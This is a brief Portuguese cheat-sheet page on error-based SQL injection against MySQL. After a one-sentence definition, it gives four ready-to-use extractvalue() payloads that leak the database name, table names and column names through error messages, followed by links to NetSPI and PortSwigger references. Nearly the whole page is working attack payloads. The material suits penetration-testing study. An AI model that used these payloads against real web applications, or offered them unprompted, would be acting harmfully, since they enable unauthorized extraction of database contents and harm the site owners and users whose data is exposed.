# SQL Injection Error Based

SQL Injection Error Based é uma vulnerabilidade aonde o atacante usa mensagens de erro do banco de dados para extrair ou inferir dados sensíveis, mesmo em cenários de injeção cega



%' and extractvalue("teste",concat(0x0a,(select database()))); -- -

%' and extractvalue("teste",concat(0x0a,(select table\_name from information\_schema.tables where table\_schema='cs' limit 0,1))); -- -

%' and extractvalue("teste",concat(0x0a,(select table\_name from information\_schema.tables where table\_schema='cs' limit 1,1))); -- -

%' and extractvalue("teste",concat(0x0a,(select column\_name from information\_schema.columns where table\_name='products' limit 0,1))); -- -



{% embed url="https://sqlwiki.netspi.com/injectionTypes/errorBased/#mysql" %}

{% embed url="https://portswigger.net/web-security/sql-injection" %}
